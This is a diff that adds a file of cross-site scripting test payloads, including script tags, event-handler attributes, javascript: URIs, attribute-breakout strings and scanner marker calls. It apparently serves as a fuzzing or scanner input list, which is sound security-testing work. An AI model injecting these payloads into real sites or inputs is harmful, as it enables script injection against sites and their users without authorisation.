@@ -1,0 +1,13 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+'\"><script>alert('XSS')</script>
+<svg/onload=alert('XSS')>
+javascript:alert('XSS')
+<a href=\"javascript:alert('XSS')\">Click me</a>
+\" autofocus onfocus=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src=\"javascript:alert('XSS')\"></iframe>
+<details ontoggle=alert('XSS')>
+<scRipt>netsparker(0x017899)</scRipt>
+x\" onmouseover=netsparker(0x019E8E) x=\"
+<scRipt>alert(0x01A5D7)</scRipt>
